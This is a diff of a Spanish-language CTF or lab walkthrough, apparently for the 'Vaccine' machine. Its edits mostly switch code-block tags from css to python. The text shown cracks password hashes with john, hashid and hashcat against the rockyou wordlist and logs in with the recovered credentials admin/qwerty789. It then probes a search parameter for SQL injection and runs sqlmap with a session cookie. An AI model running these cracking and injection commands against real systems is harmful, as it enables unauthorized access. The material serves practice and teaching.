@@ -82,14 +82,14 @@ john -wordlist=/usr/share/wordlists/rockyou.txt backuphash
 ![[2023-10-11_17-21.png]]
 #### conseguimos lo que parece ser una contraseña que esta codificada en otro hash. entonces usaremos hashid para intentar saber que tipo de hash es 
 
-``
+```python
 :hashid 2cb42f8734ea607eefed3b70af13bbd3
 ```
 ![[2023-10-11_17-42.png]]
 
 #### Podriamos probar con MD2 - MD5 y MD4 que son los mas comunes. para esto usaremos `hashcat`
 
-```css
+```python
 hashcat -a 0 -m 0 passwhash /usr/share/wordlists/rockyou.txt
 ```
 ![[2023-10-11_17-53.png]]
@@ -99,7 +99,7 @@ hashcat -a 0 -m 0 passwhash /usr/share/wordlists/rockyou.txt
 ![[2023-10-11_18-14.png]]
 
 #### iniciamos con las credenciales que hemos conseguido
-```css
+```python
 --admin
 --qwerty789
 ```
@@ -108,11 +108,11 @@ hashcat -a 0 -m 0 passwhash /usr/share/wordlists/rockyou.txt
 
 #### logramos entrar y haciendo unas pruebas rapidas parece que la pag esta conectada a la base de datos y es vulnerable a SQLI. 
 
-```css
+```python
 como podemos saber si es vulnebrable a SQLI. en el buscador ponemos una comilla simple ` y damos enter y vemos que aparece un error. esto se debe a que la pag esta leyendo la comilla como si fuera un caracter alfa numerico y no como un caracter especial como deberia ser
 ```
 para verificar esto usaremos `sqlmap`
-```css
+```python
 sqlmap -u "http://vaccine/dashboard.php?search=a" --cookie="PHPSESSID=0fdem904l7klplg6hs8q1228rg"
 
 -u para indicar la url de la pag 
@@ -131,7 +131,7 @@ sqlmap --current-db -u "http://vaccine/dashboard.php?search=a" --cookie="PHPSESS
 
 #### Podemos notar que existen 4 tipos de inyecciones SQLI y que el nombre de la base de datos es public
 
-```css
+```python
 Parameter: search (GET)
     Type: boolean-based blind
     Title: PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)
